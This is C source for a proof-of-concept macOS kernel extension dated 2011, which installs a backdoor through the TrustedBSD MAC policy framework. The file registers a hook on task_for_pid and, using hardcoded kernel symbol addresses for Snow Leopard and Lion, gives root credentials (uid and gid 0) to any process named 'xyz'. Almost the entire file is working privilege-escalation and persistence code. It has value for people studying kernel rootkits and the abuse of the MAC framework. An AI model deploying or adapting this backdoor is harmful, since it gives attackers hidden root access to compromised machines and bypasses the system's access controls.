/*
__________               
\______   \ ____ ___  ___
 |       _// __ \\  \/  /
 |    |   \  ___/ >    < 
 |____|_  /\___  >__/\_ \
		\/     \/      \/

 _______ __            ________                 __             
|_     _|  |--.-----. |  |  |  |.-----.-----.--|  |.-----.----.
  |   | |     |  -__| |  |  |  ||  _  |     |  _  ||  -__|   _|
  |___| |__|__|_____| |________||_____|__|__|_____||_____|__|  

 _____              
|     \.-----.-----.
|  --  |  _  |  _  |
|_____/|_____|___  |
             |_____| v0.3

 (c) 2011, fG! - reverser@put.as
 
 A lazy PoC for implementing backdoors in OS X TrustedBSD Mac framework.
 To activate the backdoor, call task_for_pid() in a process named "xyz"
 and EUID will be changed to 0 :-)
  
 MAC_POLICY_SET should be used instead of directly configuring the
 kernel entry points. If this is used duplicate symbol errors arise.
 Most probably because I am using XCode's kernel extension template.
 
 Based on Sedarwin project sample policies code.
 
 v0.3 also works in Lion 10.7.1
 
 This code is for 32bits kernels only!
 
*/

#include <mach/mach_types.h>
#include <sys/types.h>
#include <sys/conf.h>
#include <sys/kernel.h>
#include <sys/sysctl.h>
#include <security/mac_policy.h>
#include <sys/proc.h>
#include <string.h>
#include <sys/systm.h>
#include <stdbool.h> 
#include <sys/param.h>
#include <stdint.h>

// lame detection of Lion or Snow Leopard
// I need to learn Xcode ;-)
#define LION	0
// proc structure
#if LION
	#include "missingproclion.h"
#else
	#include "missingproc.h"
#endif

static void
mac_rex_policy_initbsd(struct mac_policy_conf *conf)
{
	// nothing to do here...
}

/*
   The symbol address for kauth_cred_setuidgid().
   This is for Snow Leopard 10.6.8
   0x00470092 T _kauth_cred_setuidgid
  
   for Lion 10.7.1
   0x0054cb90 T _kauth_cred_setuidgi 
 */

// function pointer to kauth_cred_setuidgid()
#if LION
kauth_cred_t (*real_kauth)(kauth_cred_t, uid_t, gid_t)=0x0054cb90;
#else
kauth_cred_t (*real_kauth)(kauth_cred_t, uid_t, gid_t)=0x00470092;
#endif


static int
mac_rex_policy_gettask(kauth_cred_t cred,struct proc *p)
{
	// activate lock
	lck_mtx_lock(&p->p_mlock);
	char processname[MAXCOMLEN+1];
	// retrieve the process name
	proc_name(p->p_pid, processname, sizeof(processname));
	// match our backdoor activation process
	if (strcmp(processname, "xyz") == 0)
	{
		printf("[rex_the_wonder_dog] giving r00t to %s\n", processname);
		// the old kauth_cred
        kauth_cred_t mycred = p->p_ucred;
		// get a new kauth_cred, with uid=0, and gid=0
        kauth_cred_t mynewcred = real_kauth(mycred, 0, 0);
		// copy back to our backdoor process and we have r00t!
		p->p_ucred = mynewcred;
		lck_mtx_unlock(&p->p_mlock);
		// everything is ok
		return 0;
	}
	else {
		//		printf("[rex_the_wonder_dog] task_for_pid %s\n", processname);
		// everything is ok
		lck_mtx_unlock(&p->p_mlock);
		return 0;
	}	
}

// register our handles
static struct mac_policy_ops mac_rex_ops =
{
	.mpo_policy_initbsd	= mac_rex_policy_initbsd,
	.mpo_proc_check_get_task = mac_rex_policy_gettask,
};

static mac_policy_handle_t mac_rex_handle;

static struct mac_policy_conf rex_mac_policy_conf = {      
	.mpc_name               = "rex_the_wonder_dog",                      
	.mpc_fullname           = "Rex, the wonder dog!",                   
	.mpc_labelnames         = NULL,                       
	.mpc_labelname_count    = 0,                       
	.mpc_ops                = &mac_rex_ops,                        
	.mpc_loadtime_flags     = MPC_LOADTIME_FLAG_UNLOADOK,                       
	.mpc_field_off          = NULL,                         
	.mpc_runtime_flags      = 0                        
};

// start the fun
kern_return_t rexthewonderdog_start (kmod_info_t * ki, void * d) {
	return mac_policy_register(&rex_mac_policy_conf,
							   &mac_rex_handle, d);
}

// stop the fun :-(
kern_return_t rexthewonderdog_stop (kmod_info_t * ki, void * d) {
	return mac_policy_unregister(mac_rex_handle);
}

extern kern_return_t _start(kmod_info_t *ki, void *data);
extern kern_return_t _stop(kmod_info_t *ki, void *data);


